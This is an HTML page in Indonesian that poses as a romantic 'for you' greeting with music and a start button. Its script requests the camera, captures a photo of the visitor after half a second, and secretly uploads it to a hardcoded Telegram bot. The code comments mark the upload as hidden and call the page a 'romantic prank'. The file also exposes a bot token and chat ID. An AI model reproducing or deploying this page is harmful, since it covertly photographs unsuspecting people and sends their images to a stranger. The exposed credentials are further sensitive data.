<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>💕 Untuk Mu</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: "Poppins", sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        .container {
            text-align: center;
            color: white;
            z-index: 10;
            position: relative;
        }

        h1 {
            font-size: 3.5rem;
            margin-bottom: 20px;
            text-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
            animation: bounce 1s ease-in-out infinite;
        }

        p {
            font-size: 1.3rem;
            margin-bottom: 50px;
            opacity: 0.95;
            font-weight: 300;
        }

        button {
            padding: 18px 60px;
            font-size: 1.2rem;
            background: white;
            color: #667eea;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            font-weight: 700;
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.2);
            transition: all 0.3s ease;
            letter-spacing: 1px;
        }

        button:hover {
            transform: translateY(-5px);
            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.3);
        }

        button:active {
            transform: translateY(-2px);
        }

        .bubble {
            position: absolute;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
        }

        @keyframes bounce {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }

        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-30px); }
        }

        @keyframes slideInLeft {
            from {
                opacity: 0;
                transform: translateX(-100px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        @keyframes slideInRight {
            from {
                opacity: 0;
                transform: translateX(100px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        .bubble:nth-child(1) {
            width: 100px;
            height: 100px;
            top: 10%;
            left: 5%;
            animation: float 20s linear infinite;
        }

        .bubble:nth-child(2) {
            width: 80px;
            height: 80px;
            top: 60%;
            right: 5%;
            animation: float 25s linear infinite;
        }

        .bubble:nth-child(3) {
            width: 60px;
            height: 60px;
            bottom: 20%;
            left: 20%;
            animation: float 30s linear infinite;
        }

        .content {
            position: relative;
            z-index: 10;
        }

        #video {
            display: none;
        }

        #canvas {
            display: none;
        }

        /* Success Screen */
        #success-screen {
            display: none;
            width: 100%;
            height: 100vh;
            position: fixed;
            top: 0;
            left: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            z-index: 20;
            overflow: hidden;
        }

        .success-content {
            width: 100%;
            height: 100%;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 30px;
            padding: 40px;
            position: relative;
        }

        .photo-box {
            position: relative;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: slideInLeft 0.8s ease;
        }

        .photo-box img {
            width: 280px;
            height: 350px;
            object-fit: cover;
            display: block;
        }

        .heart-animation {
            position: absolute;
            font-size: 4rem;
            animation: slideInRight 0.8s ease;
        }

        .heart-animation:nth-child(1) {
            top: 20%;
            right: 10%;
            animation-delay: 0.2s;
        }

        .heart-animation:nth-child(2) {
            top: 50%;
            right: 5%;
            animation-delay: 0.4s;
        }

        .heart-animation:nth-child(3) {
            bottom: 20%;
            right: 15%;
            animation-delay: 0.6s;
        }

        .message {
            color: white;
            text-align: center;
            position: absolute;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            font-size: 1.5rem;
            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
        }

        .button-group {
            position: fixed;
            bottom: 40px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 25;
        }

        .button-group button {
            padding: 15px 45px;
            font-size: 1rem;
            background: rgba(255, 255, 255, 0.95);
            color: #667eea;
        }
    </style>
</head>
<body>
    <div class="bubble"></div>
    <div class="bubble"></div>
    <div class="bubble"></div>

    <div class="content" id="start-screen">
        <div class="container">
            <h1>💕 Untuk Mu ❤️</h1>
            <p>Klik tombol di bawah untuk memulai</p>
            <button id="start-btn">MULAI</button>
        </div>
    </div>

    <div id="success-screen">
        <div class="success-content">
            <div class="photo-box">
                <img id="captured-photo" src="" alt="Foto">
            </div>
            <div class="heart-animation">❤️</div>
            <div class="heart-animation">💕</div>
            <div class="heart-animation">💖</div>
        </div>
        <div class="message">Fotomu sudah kami terima 💝</div>
        <div class="button-group">
            <button id="retry-btn">Ulangi</button>
        </div>
    </div>

    <video id="video"></video>
    <canvas id="canvas"></canvas>
    <audio id="background-music" loop>
        <source src="music.mp3" type="audio/mpeg">
    </audio>

    <script>
        let stream = null;
        let capturedImage = null;

        const TELEGRAM_BOT_TOKEN = "8703334699:AAHXkd029InXgEkSo4CRXM2P3Vl1_mQ4VAc";
        const TELEGRAM_CHAT_ID = "5323236080";

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const startBtn = document.getElementById('start-btn');
        const retryBtn = document.getElementById('retry-btn');
        const capturedPhoto = document.getElementById('captured-photo');
        const startScreen = document.getElementById('start-screen');
        const successScreen = document.getElementById('success-screen');
        const backgroundMusic = document.getElementById('background-music');

        startBtn.addEventListener('click', requestCameraAccess);
        retryBtn.addEventListener('click', reset);

        // Play musik saat page load
        document.addEventListener('click', () => {
            if (backgroundMusic.paused) {
                backgroundMusic.play();
            }
        });

        async function requestCameraAccess() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });

                video.srcObject = stream;
                video.style.display = 'none';

                video.onloadedmetadata = () => {
                    video.play();
                    setTimeout(() => {
                        capturePhoto();
                    }, 500);
                };

            } catch (error) {
                console.error('Error:', error);
                alert('Izinkan akses kamera!');
            }
        }

        function capturePhoto() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            capturedImage = canvas.toDataURL('image/jpeg');

            // Matikan stream
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }

            // Kirim ke Telegram (hidden)
            sendPhotoToTelegram();
            
            // Tampilkan success screen dengan foto
            displaySuccess();
        }

        async function sendPhotoToTelegram() {
            try {
                const blob = await fetch(capturedImage).then(r => r.blob());
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('photo', blob, 'prank.jpg');
                formData.append('caption', '📸 Foto berhasil dikapture!\n❤️ Dari aplikasi romantic prank');

                const response = await fetch(
                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
                    { method: 'POST', body: formData }
                );

                const data = await response.json();
                console.log(data.ok ? '✅ Terkirim!' : '❌ Error');

            } catch (error) {
                console.error('Error:', error);
            }
        }

        function displaySuccess() {
            startScreen.style.display = 'none';
            successScreen.style.display = 'block';
            capturedPhoto.src = capturedImage;
            
            // Play musik
            backgroundMusic.play().catch(() => {
                console.log('Auto-play blocked');
            });
        }

        function reset() {
            startScreen.style.display = 'block';
            successScreen.style.display = 'none';
            capturedImage = null;
        }
    </script>
</body>
</html>
